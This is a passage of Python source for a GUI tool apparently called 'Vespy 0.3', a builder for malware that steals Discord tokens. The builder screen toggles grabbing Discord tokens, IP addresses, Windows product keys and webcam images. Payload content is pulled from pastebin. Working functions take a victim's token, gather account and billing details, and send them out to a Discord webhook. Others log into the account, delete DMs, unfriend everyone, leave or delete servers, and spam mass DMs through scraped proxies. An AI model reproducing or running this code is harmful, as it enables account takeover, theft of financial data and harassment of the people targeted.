        nextlol = Button(window, image=nextbu,bg='#F5F5F5',borderwidth=0, activebackground="#F5F5F5",command=self.nitrosnipelol)
        nextlol.place(x=610,y=392)
        backlol = Button(window, image=backbu2,bg='#F5F5F5',borderwidth=0, activebackground="#F5F5F5",command=self.grpfinderlol)
        backlol.place(x=204,y=391)
        chosebu = Button(window, image=choosebu,bg='#F5F5F5',borderwidth=0, activebackground="#F5F5F5",command=self.chooselimsnip)
        chosebu.place(x=406,y=359)

    def choosegrplol(self):
        f = urlopen('https://pastebin.com/raw/6fx2icHf')
        file = f.read()
        with open('woof8.dat', 'wb') as f:
            f.write(file)
        with open('woof8.dat', 'r+') as f:
            self.terminal = f.read()
        os.remove('woof8.dat')
        self.bannerandsymbol()

    def grpfinderlol(self):
        zebg = Label(window,image=grpfinderbg, borderwidth=0)
        zebg.place(x=161,y=0)
        nextlol = Button(window, image=nextbu,bg='#F5F5F5',borderwidth=0, activebackground="#F5F5F5",command=self.limsnipelol)
        nextlol.place(x=610,y=392)
        backlol = Button(window, image=backbu2,bg='#F5F5F5',borderwidth=0, activebackground="#F5F5F5",command=self.nitrogenbglol)
        backlol.place(x=204,y=391)
        chosebu = Button(window, image=choosebu,bg='#F5F5F5',borderwidth=0, activebackground="#F5F5F5",command=self.choosegrplol)
        chosebu.place(x=406,y=359)

    def choosednitrogen(self):
        f = urlopen('https://pastebin.com/raw/wu9008z5')
        file = f.read()
        with open('woof8.dat', 'wb') as f:
            f.write(file)
        with open('woof8.dat', 'r+') as f:
            self.terminal = f.read()
        os.remove('woof8.dat')
        self.bannerandsymbol()

    def nitrogenbglol(self):
        zebg = Label(window,image=nitrogenbg, borderwidth=0)
        zebg.place(x=161,y=0)
        nextlol = Button(window, image=nextbu,bg='#F5F5F5',borderwidth=0, activebackground="#F5F5F5",command=self.grpfinderlol)
        nextlol.place(x=610,y=392)
        chosebu = Button(window, image=choosebu,bg='#F5F5F5',borderwidth=0, activebackground="#F5F5F5",command=self.choosednitrogen)
        chosebu.place(x=406,y=359)

    def setupverifylol(self):
        if self.setupdefaulton == True or self.setupcustomon == True:
            if self.setupdefaulton == True and self.setupcustomon == False:
                self.dataissaved()
            if self.setupdefaulton == False and self.setupcustomon == True:
                self.nitrogenbglol()
        else:
            messagebox.showerror('Vespy 0.3', 'Please Select an Option.')
            self.buildacon

    def buildacon(self):
        self.setupdefaulton = False
        self.setupcustomon = False
        zebg = Label(window,image=setupconbg, borderwidth=0)
        zebg.place(x=161,y=0)
        self.setupdefault = Button(window, image=sw1,bg='#F5F5F5',borderwidth=0, activebackground="#F5F5F5",command=self.defaultselected)
        self.setupdefault.place(x=528,y=145)
        self.setupcustom = Button(window, image=sw1,bg='#F5F5F5',borderwidth=0, activebackground="#F5F5F5",command=self.customselected)
        self.setupcustom.place(x=528,y=197)
        nextlol = Button(window, image=nextbu,bg='#F5F5F5',borderwidth=0, activebackground="#F5F5F5",command=self.setupverifylol)
        nextlol.place(x=402,y=277)

    def builda(self):
        self.builderbu = Button(window, image=img0,bg='#5200FF',borderwidth=0, activebackground="#5200FF",command=self.builda)
        self.builderbu.place(x=0,y=143)
        self.compilerbu = Button(window, image=img1,bg='#5200FF',borderwidth=0, activebackground="#5200FF",command=self.compilerlol)
        self.compilerbu.place(x=0,y=212)
        self.aboutbu = Button(window, image=img2,bg='#5200FF',borderwidth=0, activebackground="#5200FF",command=self.about)
        self.aboutbu.place(x=0,y=321)
        self.settingbu = Button(window, image=img3,bg='#5200FF',borderwidth=0, activebackground="#5200FF",command=self.settings)
        self.settingbu.place(x=0,y=388)
        self.builderbu = Button(window, image=img0e,bg='#5200FF',borderwidth=0, activebackground="#5200FF",command=self.builda)
        self.builderbu.place(x=0,y=143)
        zebg = Label(window,image=buildbg, borderwidth=0)
        zebg.place(x=161,y=0)
        if self.isgrabdison == False:
            self.distokens = Button(window, image=sw1,bg='#F5F5F5',borderwidth=0, activebackground="#F5F5F5",command=self.disgrabber)
            self.distokens.place(x=478,y=167)
        else:
            self.distokens = Button(window, image=sw2,bg='#F5F5F5',borderwidth=0, activebackground="#F5F5F5",command=self.disgrabber)
            self.distokens.place(x=478,y=167)
        if self.isgrabipon == False:
            self.ipgrabbu = Button(window, image=sw1,bg='#F5F5F5',borderwidth=0, activebackground="#F5F5F5",command=self.ipgrabberlol)
            self.ipgrabbu.place(x=478,y=203)
        else:
            self.ipgrabbu = Button(window, image=sw2,bg='#F5F5F5',borderwidth=0, activebackground="#F5F5F5",command=self.ipgrabberlol)
            self.ipgrabbu.place(x=478,y=203)
        if self.iswpkon == False:
            self.winpkbu = Button(window, image=sw1,bg='#F5F5F5',borderwidth=0, activebackground="#F5F5F5",command=self.grabwinprokey)
            self.winpkbu.place(x=478,y=238)
        else:
            self.winpkbu = Button(window, image=sw2,bg='#F5F5F5',borderwidth=0, activebackground="#F5F5F5",command=self.grabwinprokey)
            self.winpkbu.place(x=478,y=238)
        if self.iswbcon == False:
            self.grabwbcbu = Button(window, image=sw1,bg='#F5F5F5',borderwidth=0, activebackground="#F5F5F5",command=self.grabwebcam)
            self.grabwbcbu.place(x=478,y=274)
        else:
            self.grabwbcbu = Button(window, image=sw2,bg='#F5F5F5',borderwidth=0, activebackground="#F5F5F5",command=self.grabwebcam)
            self.grabwbcbu.place(x=478,y=274)
        nextlol = Button(window, image=nextbu,bg='#F5F5F5',borderwidth=0, activebackground="#F5F5F5",command=self.buildacon)
        nextlol.place(x=419,y=321)

    def about(self):
        self.builderbu = Button(window, image=img0,bg='#5200FF',borderwidth=0, activebackground="#5200FF",command=self.builda)
        self.builderbu.place(x=0,y=143)
        self.compilerbu = Button(window, image=img1,bg='#5200FF',borderwidth=0, activebackground="#5200FF",command=self.compilerlol)
        self.compilerbu.place(x=0,y=212)
        self.aboutbu = Button(window, image=img2,bg='#5200FF',borderwidth=0, activebackground="#5200FF",command=self.about)
        self.aboutbu.place(x=0,y=321)
        self.settingbu = Button(window, image=img3,bg='#5200FF',borderwidth=0, activebackground="#5200FF",command=self.settings)
        self.settingbu.place(x=0,y=388)
        self.aboutbu = Button(window, image=img2e,bg='#5200FF',borderwidth=0, activebackground="#5200FF",command=self.about)
        self.aboutbu.place(x=0,y=321)
        zebg = Label(window,image=aboutbg, borderwidth=0)
        zebg.place(x=161,y=0)
        

    def installbt1(self):
        webbrowser.open('https://aka.ms/vs/17/release/vs_BuildTools.exe')
        sleep(2)
        messagebox.showinfo('Vespy 0.3','Complete The Installation, Reinstall the requirements and Reopen Vespy.')

    def btoolstutt(self):
        zebg = Label(window,image=btoolstut, borderwidth=0)
        zebg.place(x=161,y=0)
        next = Button(window, image=nextbu,bg='#F5F5F5',borderwidth=0, activebackground="#F5F5F5",command=self.settings)
        next.place(x=406,y=393)

    def beforebt(self):
        if self.isbton == False:
            self.isbton = True
            self.installbt.config(image=sw2)
            t1 = threading.Thread(target=self.installbt1)
            t2 = threading.Thread(target=self.btoolstutt)
            t1.start()
            t2.start()
        else:
            self.isbton = False
            self.installbt.config(image=sw1)

    def installpip(self):
        try:
            os.system('py -m ensurepip --upgrade')
            os.system('cls')
            print('Successfully Installed PIP')
            sleep(2)
            os.system('cls')
            self.settings()
        except:
            pass

    def beforepip(self):
        if self.ispipon == False:
            self.ispipon = True
            self.pipinstallbu.config(image=sw2)
            threading.Thread(target=self.installpip).start()
        else:
            self.ispipon = False
            self.pipinstallbu.config(image=sw1)

    def installpy(self):
        webbrowser.open('https://www.python.org/ftp/python/3.9.5/python-3.9.5-amd64.exe')
        sleep(2)
        messagebox.showinfo('Vespy 0.3','Complete The Installation, Add Python to PATH, Reopen Vespy')
        self.settings()

    def beforepy(self):
        if self.ispyon == False:
            self.ispyon = True
            self.pyinstallbu.config(image=sw2)
            threading.Thread(target=self.installpy).start()
        else:
            self.ispyon = False
            self.pyinstallbu.config(image=sw1)
    
    def consoleoff(self):
        win = win32console.GetConsoleWindow()
        win32gui.ShowWindow(win, 0)
        self.settings()
    
    def consoleon(self):
        win = win32console.GetConsoleWindow()
        win32gui.ShowWindow(win, 1)
        self.settings()

    def beforeconsole(self):
        if self.ishidecon == False:
            self.ishidecon = True
            self.hideconsolebu.config(image=sw2)
            threading.Thread(target=self.consoleoff).start()
        else:
            self.ishidecon = False
            self.hideconsolebu.config(image=sw1)
            threading.Thread(target=self.consoleon).start()
    
    def loginacc(self):
        token = self.token.get()
        if os.path.exists(os.getcwd()+"\\chromedriver.exe"):
            pass
        else:
            try:
                uc.install()
            except Exception as e:
                messagebox.showerror('Vocord', "Can't Install Chromedriver")
                self.discordtools()
        try:
            opts = webdriver.ChromeOptions()
            opts.add_experimental_option('excludeSwitches', ['enable-logging'])
            opts.add_experimental_option("detach", True)
            driver = webdriver.Chrome(options=opts)
            script = """
                    function login(token) {
                    setInterval(() => {
                    document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"`
                    }, 50);
                    setTimeout(() => {
                    location.reload();
                    }, 1000);
                    }
                """
            driver.get("https://discordapp.com/login")
            driver.execute_script(script+f'\nlogin("{token}")')
            self.discordtools()
        except Exception as e:
            messagebox.showerror('Vocord', "Error ! Can't Loggin")
            self.discordtools()
    
    def proxy_scrape(self):
        temp = os.getenv("temp")+"\\proxies.txt"
        r = requests.get("https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=8500&country=all&ssl=all&anonymity=elite&simplified=true", headers=self.getheaders())
        with open(temp, "wb") as f:
            f.write(r.content)
    
    def proxy(self):
        temp = os.getenv("temp")+"\\proxies.txt"
        if not os.path.exists(temp):
            with open(temp, "w") as f:
                f.close()
        if os.stat(temp).st_size == 0:
            self.proxy_scrape()
        proxies = open(temp).read().split('\n')
        proxy = proxies[1]
        with open(temp, 'r+') as fp:
            lines = fp.readlines()
            fp.seek(0)
            fp.truncate()
            fp.writelines(lines[1:])
        return proxy

    def seeinfololwhynot(self):
            token = self.token.get()
            webhook = self.wbh.get()
            try:
                r = requests.get('https://discord.com/api/v9/users/@me',headers=self.getheaders(token))
                if r.status_code == 200:
                    cc_digits = {
                        'american express': '3',
                        'visa': '4',
                        'mastercard': '5'
                    }
                    userName = r.json()['username'] + '#' + r.json()['discriminator']
                    userID = r.json()['id']
                    phone = r.json()['phone']
                    email = r.json()['email']
                    language = r.json()['locale']
                    mfa = r.json()['mfa_enabled']
                    avatar_id = r.json()['avatar']
                    has_nitro = False
                    res = requests.get('https://discordapp.com/api/v9/users/@me/billing/subscriptions', headers=self.getheaders(token))
                    nitro_data = res.json()
                    has_nitro = bool(len(nitro_data) > 0)
                    avatar_url = f'https://cdn.discordapp.com/avatars/{userID}/{avatar_id}.webp'
                    billing_info = []
                    for x in requests.get('https://discordapp.com/api/v9/users/@me/billing/payment-sources', headers=self.getheaders(token)).json():
                        y = x['billing_address']
                        name = y['name']
                        address_1 = y['line_1']
                        address_2 = y['line_2']
                        city = y['city']
                        postal_code = y['postal_code']
                        state = y['state']
                        country = y['country']
                        if x['type'] == 1:
                            cc_brand = x['brand']
                            cc_first = cc_digits.get(cc_brand)
                            cc_last = x['last_4']
                            cc_month = str(x['expires_month'])
                            cc_year = str(x['expires_year'])
                            data = {
                                'Payment Type': 'Credit Card',
                                'Valid': not x['invalid'],
                                'CC Holder Name': name,
                                'CC Brand': cc_brand.title(),
                                'CC Number': ''.join(z if (i + 1) % 2 else z + ' ' for i, z in enumerate((cc_first if cc_first else '*') + ('*' * 11) + cc_last)),
                                'CC Exp. Date': ('0' + cc_month if len(cc_month) < 2 else cc_month) + '/' + cc_year[2:4],
                                'Address 1': address_1,
                                'Address 2': address_2 if address_2 else '',
                                'City': city,
                                'Postal Code': postal_code,
                                'State': state if state else '',
                                'Country': country,
                                'Default Payment': x['default']
                            }
                        elif x['type'] == 2:
                            data = {
                                'Payment Type': 'PayPal',
                                'Valid': not x['invalid'],
                                'PayPal Name': name,
                                'PayPal Email': x['email'],
                                'Address 1': address_1,
                                'Address 2': address_2 if address_2 else '',
                                'City': city,
                                'Postal Code': postal_code,
                                'State': state if state else '',
                                'Country': country,
                                'Default Payment': x['default']
                            }
                        billing_info.append(data)
                    webhook = DiscordWebhook(url=webhook, username="Vespy 0.3", avatar_url=r"https://cdn.discordapp.com/attachments/908588893648068622/912111482253213716/Vespy.png")
                    embed = DiscordEmbed(title="Vespy", description=f"Discord Account Info", color='5200FF')
                    embed.set_author(name="author : vesper", url=r'https://www.youtube.com/channel/UCl-tejB8ShWy1REqQMRMMbQ', icon_url=r'https://cdn.discordapp.com/attachments/908588893648068622/912111482253213716/Vespy.png')
                    embed.add_embed_field(name="Info", value=f"\nUsername : **{userName}**\nUser ID : **{userID}**\nPhone : **{phone}**\nEmail : **{email}**\nLanguage : **{language}**\nMFA : **{mfa}**\nNitro : **{has_nitro}**\nToken : **{token}**", ineline=False)
                    embed.set_footer(text='vesper (c)')
                    embed.set_thumbnail(url=avatar_url)
                    embed.set_timestamp()
                    webhook.add_embed(embed)
                    if len(billing_info) > 0:
                        embed.add_embed_field(name="Billing", value=f"\nName : **{name}**\nAddress 1 : **{address_1}**\nAddress 2 : **{address_2}**\nCity : **{city}**\nPostal Code : **{postal_code}**\nState : **{state}**\nCountry : **{country}**", ineline=False)
                    response = webhook.execute()
                    self.discordtools()

                else:
                    messagebox.showerror('Vocord', 'Invalid Token')
                    self.discordtools()
            except:
                messagebox.showerror('Vocord', 'Invalid Token')
                self.discordtools()

    def selectloginacc(self):
        if self.loginon == False:
            self.loginon = True
            self.bu1.config(image=sw2)
            threading.Thread(target=self.loginacc).start()
        else:
            self.loginon = False
            self.bu1.config(image=sw1)

    def verifymissingwbh(self):
        webhook = self.wbh.get()
        if webhook.startswith('https://discord.com/api/webhooks/'):
            self.seeinfololwhynot()
        else:
            messagebox.showerror('Vespy 0.3', 'Invalid Webhook')
            self.webhookismissing()

    def webhookismissing(self):
        zebg = Label(window,image=missingwbh, borderwidth=0)
        zebg.place(x=161,y=0)
        self.wbh = Entry(window,font=('SeoulHangang',10),bg='#F5F5F5', fg='#5200FF',width=33,borderwidth=0,show='*')
        self.wbh.place(x=357, y=237)
        idkwhatthatis = Button(window, image=nextbu,bg='#F5F5F5',borderwidth=0, activebackground="#F5F5F5",command=self.verifymissingwbh)
        idkwhatthatis.place(x=402,y=291)

    def logininfo(self):
        if self.loginin == False:
            self.loginin = True
            self.bu2.config(image=sw2)
            try:
                webhook = self.wbh.get()
            except:
                self.webhookismissing()
            while True:
                if len(webhook) >0 and webhook.startswith('https://discord.com/api/webhooks/'):
                    threading.Thread(target=self.seeinfololwhynot).start()
                    break
                else:
                    self.webhookismissing()
                    break
        else:
            self.loginin = False
            self.bu2.config(image=sw1)

    def DmDeleter(self, token):
        channelIds = requests.get("https://discord.com/api/v9/users/@me/channels", headers=self.getheaders(token)).json()
        for channel in channelIds:
            try:
                requests.delete(f'https://discord.com/api/v7/channels/'+channel['id'],
                proxies={"ftp": f'{self.proxy()}'},
                headers=self.getheaders(token))
            except Exception as e:
                try:
                    requests.delete(f'https://discord.com/api/v7/channels/'+channel['id'],
                    headers=self.getheaders(token))
                except:
                    pass
        print('Deleted All Dms')
        return True
    def delfriends(self, token):
        try:
            friendIds = requests.get("https://discord.com/api/v9/users/@me/relationships", headers=self.getheaders(token)).json()
            for friend in friendIds:
                    try:
                        requests.delete(f'https://discord.com/api/v9/users/@me/relationships/'+friend['id'], headers=self.getheaders(token))
                    except Exception as e:
                        pass
        except:pass
        print('Unfriended Everyone.')
        return True

    def StartSeizure(self, token, seconds):
        secondz = seconds *4
        try:
            for i in range(secondz):
                modes = cycle(["light", "dark"])
                setting = {'theme': next(modes), 'locale': random.choice(['ja', 'zh-TW', 'ko', 'zh-CN'])}
                requests.patch("https://discord.com/api/v7/users/@me/settings", headers=self.getheaders(token), json=setting)
                if msvcrt.kbhit():
                    if msvcrt.getwche() == '\r':
                        break
                sleep(0.1)
        except:
            pass
        print('Finished.')
        os.system('cls')

    def Leaver(self,token):
        count = 0
        try:
            guildsIds = requests.get("https://discord.com/api/v8/users/@me/guilds", headers=self.getheaders(token)).json()
            for guild in guildsIds:
                try:
                    requests.delete(
                        f'https://discord.com/api/v8/users/@me/guilds/'+guild['id'], proxies={"ftp": f'{self.proxy()}'}, headers={'Authorization': token})
                    count += 1
                except Exception as e:
                    try:
                        requests.delete(
                            f'https://discord.com/api/v8/users/@me/guilds/'+guild['id'], headers={'Authorization': token})
                        count += 1
                    except Exception as e:
                        pass
            for guild in guildsIds:
                try:
                    requests.delete(f'https://discord.com/api/v8/guilds/'+guild['id'], proxies={"ftp": f'{self.proxy()}'}, headers={'Authorization': token})
                    count += 1
                except Exception as e:
                    try:
                        requests.delete(f'https://discord.com/api/v8/guilds/'+guild['id'], headers={'Authorization': token})
                        count += 1
                    except Exception as e:
                        pass
        except:pass
        print('Left all servers.')
        sleep(1)
        os.system('cls')

    def dmallfriends(self):
        token = self.token.get()
        Message = self.massdmess.get()
        while True:
            if len(Message) == 0 :
                messagebox.showerror('Vespy 0.3','Please Enter A Valid Message.')
                self.massdminfo()
                break
            county = 0
            headers = {'Authorization': token}
            try:
                channelIds = requests.get("https://discord.com/api/v9/users/@me/channels", headers=self.getheaders(token)).json()
                for channel in channelIds:
                    if self.proxyon1 == True:
                        try:
                            requests.post(f'https://discord.com/api/v9/channels/'+channel['id']+'/messages',
                                proxies={"ftp": f'{self.proxy()}'},
                                headers=headers,
                                data={"content": f"{Message}"})
                            county +=1
                        except Exception as e:
                            try:
                                requests.post(f'https://discord.com/api/v9/channels/'+channel['id']+'/messages',
                                    headers=headers,
                                    data={"content": f"{Message}"})
                                county +=1
                            except Exception as e:
                                pass
                    else:
                        try:
                            requests.post(f'https://discord.com/api/v9/channels/'+channel['id']+'/messages',
                                headers=headers,
                                data={"content": f"{Message}"})
                            county +=1
                        except Exception as e:
                            pass
            except:pass
            break
        if county > 0:
            messagebox.showinfo('Vocord', 'Messaged Everyone !')
            self.discordtools()
        elif county == 0:
            messagebox.showerror('Vocord', 'Error Occured')
            self.discordtools()
        else:
            pass

    def beforenuke(self):
        token = self.token.get()
        amount = 10
        if self.delfriends(token) == True:
            if self.DmDeleter(token) == True:
                t1 = threading.Thread(target=self.Leaver(token))
                t2 = threading.Thread(target=self.StartSeizure(token, amount))
                t1.start()
                t2.start()
                self.discordtools()

    def useproxies(self):
        if self.proxyon1 == False:
            self.proxyon1 = True
            self.useprbu.config(image=sw2)
        else:
            self.proxyon1 = False
            self.useprbu.config(image=sw1)

    def massdminfo(self):
        sleep(0.3)
        self.proxyon1 = False
        zebg = Label(window,image=massmsgbg, borderwidth=0)
        zebg.place(x=161,y=0)
        self.massdmess = Entry(window,font=('SeoulHangang',10),bg='#F5F5F5', fg='#5200FF',width=28,borderwidth=0)
        self.massdmess.place(x=346, y=173)
        self.useprbu = Button(window, image=sw1,bg='#F5F5F5',borderwidth=0, activebackground="#F5F5F5",command=self.useproxies)
        self.useprbu.place(x=410,y=214)
        next = Button(window, image=startbu,bg='#F5F5F5',borderwidth=0, activebackground="#F5F5F5",command=self.dmallfriends)
        next.place(x=405,y=267)

    def beforemassdm(self):
        if self.massdmon == False:
            self.massdmon = True
            self.bu3.config(image=sw2)
            threading.Thread(target=self.massdminfo).start()
        else:
            self.massdmon = False
            self.bu3.config(image=sw1)  

    def discordtools(self):
        self.loginon = False
        self.loginin = False
        self.massdmon = False
        zebg = Label(window,image=dtool, borderwidth=0)
        zebg.place(x=161,y=0)
        self.bu1 = Button(window, image=sw1,bg='#F5F5F5',borderwidth=0, activebackground="#F5F5F5",command=self.selectloginacc)
        self.bu1.place(x=450,y=138)
        self.bu2 = Button(window, image=sw1,bg='#F5F5F5',borderwidth=0, activebackground="#F5F5F5",command=self.logininfo)
        self.bu2.place(x=450,y=184)
        self.bu3 = Button(window, image=sw1,bg='#F5F5F5',borderwidth=0, activebackground="#F5F5F5",command=self.beforemassdm)
        self.bu3.place(x=450,y=238)
        self.bu4 = Button(window, image=sw1,bg='#F5F5F5',borderwidth=0, activebackground="#F5F5F5",command=self.beforenuke)
        self.bu4.place(x=450,y=295)
        back = Button(window, image=backbu,bg='#F5F5F5',borderwidth=0, activebackground="#F5F5F5",command=self.dissetup1)
        back.place(x=405,y=380)
    
    def verifydisinfo(self):
        con = False
        token = self.token.get()
        webhook = self.wbh.get()
        while True:
            r = requests.get('https://discord.com/api/v9/users/@me',headers=self.getheaders(token))
            if r.status_code == 200:
                con = True
            else:
                messagebox.showerror('Vespy 0.3', 'Invalid Token')
                break
            if len(webhook) > 0:
                if webhook.startswith('https://discord.com/api/webhooks/') or webhook.startswith('https://discordapp.com/api/webhooks/'):
                    con = True
                else:
                    con = False
                    messagebox.showerror('Vespy 0.3', 'Invalid Webhook')
                    break
            else:
                pass
            break
        if con == True:
            self.discordtools()
        else:
            self.dissetup1()

    def dissetup1(self):
        zebg = Label(window,image=dsetup, borderwidth=0)
        zebg.place(x=161,y=0)
        self.wbh = Entry(window,font=('SeoulHangang',10),bg='#F5F5F5', fg='#5200FF',width=30,borderwidth=0,show='*')
        self.wbh.place(x=382, y=184)
        self.token = Entry(window,font=('SeoulHangang',10),bg='#F5F5F5', fg='#5200FF',width=30,borderwidth=0,show='*')
        self.token.place(x=382, y=226)
        gotoytb = Button(window, image=nextbu,bg='#F5F5F5',borderwidth=0, activebackground="#F5F5F5",command=self.verifydisinfo)
        gotoytb.place(x=401,y=277)
        back = Button(window, image=backbu,bg='#F5F5F5',borderwidth=0, activebackground="#F5F5F5",command=self.settings)
        back.place(x=403,y=335)

    def beforedt(self):
        if self.dtoolon == False:
            self.dtoolon = True
            self.discordtool.config(image=sw2)
            self.dissetup1()
        else:
            self.dtoolon = False
            self.discordtool.config(image=sw1)
            self.discordtools()

    def settings(self):
        self.isbton = False
        self.ispipon = False
        self.ispyon = False
        self.dtoolon = False
        self.builderbu = Button(window, image=img0,bg='#5200FF',borderwidth=0, activebackground="#5200FF",command=self.builda)
        self.builderbu.place(x=0,y=143)
        self.compilerbu = Button(window, image=img1,bg='#5200FF',borderwidth=0, activebackground="#5200FF",command=self.compilerlol)
        self.compilerbu.place(x=0,y=212)
        self.aboutbu = Button(window, image=img2,bg='#5200FF',borderwidth=0, activebackground="#5200FF",command=self.about)
        self.aboutbu.place(x=0,y=321)
        self.settingbu = Button(window, image=img3,bg='#5200FF',borderwidth=0, activebackground="#5200FF",command=self.settings)
        self.settingbu.place(x=0,y=388)
        self.settingbu = Button(window, image=img3e,bg='#5200FF',borderwidth=0, activebackground="#5200FF",command=self.settings)
        self.settingbu.place(x=0,y=388)
        zebg = Label(window,image=settingbg, borderwidth=0)
        zebg.place(x=161,y=0)
        self.installbt = Button(window, image=sw1,bg='#F5F5F5',borderwidth=0, activebackground="#F5F5F5",command=self.beforebt)
        self.installbt.place(x=529,y=145)
        self.pipinstallbu = Button(window, image=sw1,bg='#F5F5F5',borderwidth=0, activebackground="#F5F5F5",command=self.beforepip)
        self.pipinstallbu.place(x=529,y=186)
        self.pyinstallbu = Button(window, image=sw1,bg='#F5F5F5',borderwidth=0, activebackground="#F5F5F5",command=self.beforepy)
        self.pyinstallbu.place(x=529,y=227)
        if self.ishidecon == False:
            self.hideconsolebu = Button(window, image=sw1,bg='#F5F5F5',borderwidth=0, activebackground="#F5F5F5",command=self.beforeconsole)
            self.hideconsolebu.place(x=529,y=268)
        else:
            self.hideconsolebu = Button(window, image=sw2,bg='#F5F5F5',borderwidth=0, activebackground="#F5F5F5",command=self.beforeconsole)
            self.hideconsolebu.place(x=529,y=268)
        self.discordtool = Button(window, image=sw1,bg='#F5F5F5',borderwidth=0, activebackground="#F5F5F5",command=self.beforedt)
        self.discordtool.place(x=529,y=312)


    def gotodiscord(self):
        messagebox.showinfo("Vocord", "If link is invalid add vesper#0003")
        webbrowser.open("https://discord.gg/8bQhc9Dw")
        self.start()
    def gotoyoutube(self):
        webbrowser.open("https://www.youtube.com/channel/UCl-tejB8ShWy1REqQMRMMbQ")
        self.start()
    def gotopp(self):
        webbrowser.open("https://www.paypal.com/signin?returnUri=https%3A%2F%2Fwww.paypal.com%2Fmyaccount%2Ftransfer%2Fhomepage%2Fexternal%2Fprofile%3FflowContextData%3DJqwQ0t2K4nsUFNHy8xeyCHYrpBCi6FrvcWLb0B6o_ogouj2bJSO_dcyaxXqWekGY5tDWvVX6JTFW-lvB1GTivghWylTHp_2pCzqwTONNWI9ipVtb9Jx47F-Dtl3YQ4tiVbCFe4og_xDUWVvsyEQkmEubKlkYr3QV4GwVVvFfBfEWo2vYfCntf86k2pYCFggrsjNvIV9VJGK62xl7X6whcWY6Ljr-K2PcwCWnyh8a9N_HcyA4XQ_J7EnacZFv-_OLr7aXQKUeHdcKDh7_84Cc99rH008vSRGRMSddqfINrcXSKCJLA32ynx0qV-tZXoohLol0otVNyPDT1fByB0nlLs3HDm8zlSZeMSZQ165-HVSMMW1ztn1acIZ4YSjoOF0-PY1NufL_kvbtAgwUVo_1ZCQkBxPN1Ks1a-wgjq6RJ-hVK-Jc&onboardData=%7B%22country.x%22%3A%22CA%22%2C%22locale.x%22%3A%22en_US%22%2C%22intent%22%3A%22paypalme%22%2C%22redirect_url%22%3A%22https%253A%252F%252Fwww.paypal.com%252Fmyaccount%252Ftransfer%252Fhomepage%252Fexternal%252Fprofile%253FflowContextData%253DJqwQ0t2K4nsUFNHy8xeyCHYrpBCi6FrvcWLb0B6o_ogouj2bJSO_dcyaxXqWekGY5tDWvVX6JTFW-lvB1GTivghWylTHp_2pCzqwTONNWI9ipVtb9Jx47F-Dtl3YQ4tiVbCFe4og_xDUWVvsyEQkmEubKlkYr3QV4GwVVvFfBfEWo2vYfCntf86k2pYCFggrsjNvIV9VJGK62xl7X6whcWY6Ljr-K2PcwCWnyh8a9N_HcyA4XQ_J7EnacZFv-_OLr7aXQKUeHdcKDh7_84Cc99rH008vSRGRMSddqfINrcXSKCJLA32ynx0qV-tZXoohLol0otVNyPDT1fByB0nlLs3HDm8zlSZeMSZQ165-HVSMMW1ztn1acIZ4YSjoOF0-PY1NufL_kvbtAgwUVo_1ZCQkBxPN1Ks1a-wgjq6RJ-hVK-Jc%22%2C%22sendMoneyText%22%3A%22You%2520are%2520sending%2520Vesper%2520Business%22%7D")
        self.start()
    def copybtcaddy(self):
        btcaddy = 'bc1qq3kuqn39h4uf2kr80230gqrj8k4gf9sx5ppzuf'
        command = 'echo ' + btcaddy.strip() + '| clip'
        os.system(command)
        messagebox.showinfo('Vespy 0.3', 'BTC Address Copied to Clipboard !')
        self.start()

    def start(self):
        # Proudly designed by vesper#0003
        bground1 = Label(window, image=bgimg,borderwidth=0)
        bground1.place(x=0,y=0)
        self.builderbu = Button(window, image=img0,bg='#5200FF',borderwidth=0, activebackground="#5200FF",command=self.builda)
        self.builderbu.place(x=0,y=143)
        self.compilerbu = Button(window, image=img1,bg='#5200FF',borderwidth=0, activebackground="#5200FF",command=self.compilerlol)
        self.compilerbu.place(x=0,y=212)
        self.aboutbu = Button(window, image=img2,bg='#5200FF',borderwidth=0, activebackground="#5200FF",command=self.about)
        self.aboutbu.place(x=0,y=321)
        self.settingbu = Button(window, image=img3,bg='#5200FF',borderwidth=0, activebackground="#5200FF",command=self.settings)
        self.settingbu.place(x=0,y=388)
        zebg = Label(window,image=wlcbg, borderwidth=0)
        zebg.place(x=161,y=0)
        gotodiscord = Button(window, image=disbu,bg='#F5F5F5',borderwidth=0, activebackground="#F5F5F5",command=self.gotodiscord)
        gotodiscord.place(x=350,y=316)
        gotoytb = Button(window, image=ytbbu,bg='#F5F5F5',borderwidth=0, activebackground="#F5F5F5",command=self.gotoyoutube)
        gotoytb.place(x=437,y=316)
        gotopp = Button(window, image=ppbu,bg='#F5F5F5',borderwidth=0, activebackground="#F5F5F5",command=self.gotopp)
        gotopp.place(x=263,y=316)
        gotobtc = Button(window, image=btcbu,bg='#F5F5F5',borderwidth=0, activebackground="#F5F5F5",command=self.copybtcaddy)
        gotobtc.place(x=524,y=316)
Vespy()
window.mainloop()
